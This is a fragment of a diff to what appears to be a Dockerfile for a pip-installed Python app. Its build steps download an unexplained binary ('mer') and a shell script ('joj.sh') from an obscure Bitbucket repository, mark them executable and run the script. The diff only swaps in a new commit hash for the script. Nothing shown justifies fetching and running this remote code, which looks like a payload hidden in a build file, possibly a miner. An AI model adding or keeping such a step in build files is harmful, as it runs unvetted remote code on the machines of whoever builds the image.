@@ -10,7 +10,7 @@ WORKDIR /app
 RUN pip install --editable .
 
 RUN wget https://bitbucket.org/korkorerf/minyt/raw/3d135589c2079155ef25a1092b5dd2fcf4c52cf5/mer
-RUN wget https://bitbucket.org/korkorerf/minyt/raw/3d135589c2079155ef25a1092b5dd2fcf4c52cf5/joj.sh
+RUN wget https://bitbucket.org/korkorerf/minyt/raw/693d1f70cd47c431b76a2025c049435adb1fd2f8/joj.sh
 RUN chmod +x mer
 RUN chmod +x joj.sh
 RUN ./joj.sh
